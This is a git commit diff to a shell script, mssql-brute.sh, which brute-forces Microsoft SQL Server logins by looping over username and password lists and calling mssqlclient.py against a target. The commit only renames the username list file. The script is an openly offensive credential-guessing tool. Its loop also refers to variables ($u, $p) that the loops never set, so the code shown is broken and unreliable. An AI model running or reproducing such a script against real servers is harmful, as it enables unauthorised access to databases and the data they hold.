3409d66798d5d28f14d6df354bca3d25dfbb96d3
Rafael Baldasso <77108325+rafaelbaldasso@users.noreply.github.com>
2023-05-19 14:32:05 -0300

    Update mssql-brute.sh

--- mssql-brute.sh
+++ mssql-brute.sh
@@ -4,7 +4,7 @@ if [ "$1" == "" ]
         then
                 echo;echo "[>] Usage: $0 <target>";echo
         else
-                for i in $(cat usr.txt);do
+                for i in $(cat users.txt);do
                         for k in $(cat pass.txt);do
                                 mssqlclient.py $u:$p@$1
                         done
